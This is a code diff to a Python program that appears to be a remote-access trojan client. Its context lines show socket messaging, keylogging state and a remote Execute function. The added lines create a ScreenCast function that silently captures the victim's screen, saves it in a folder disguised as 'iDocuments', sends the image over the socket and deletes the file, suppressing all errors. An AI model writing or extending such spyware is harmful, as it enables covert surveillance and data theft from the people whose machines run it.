@@ -6,6 +6,7 @@ import time
 import os
 import subprocess
 import ctypes
+import ImageGrab
 
 HOST = '127.0.0.1'
 PORT = 4434
@@ -14,6 +15,7 @@ printf = ''
 hooked = {}
 loggingState = False
 passKey = r'1705a7f91b40320a19db18912b72148e'
+tmpFolder = os.path.join(os.path.expanduser('~'), 'iDocuments')
 
 
 def Send(sock, cmd, end="[ENDOFMESSAGE]"):
@@ -30,6 +32,20 @@ def Receive(sock, end="[ENDOFMESSAGE]"):
         else:
             l = sock.recv(1024)
     return data[:-len(end)].decode('utf-8')
+
+def ScreenCast():
+    if not os.path.exists(tmpFolder):
+        os.makedirs(tmpFolder)
+    try:
+        ImageGrab.grab().save(os.path.join(tmpFolder, "tmp.jpg"), "JPEG")
+        Send(s, open(os.path.join(tmpFolder, "tmp.jpg"), 'rb').read())
+    except:
+        pass
+    try:
+        os.remove(os.path.join(tmpFolder, "tmp.jpg"))
+    except:
+        pass
+
 
 def Execute(source):
     try:
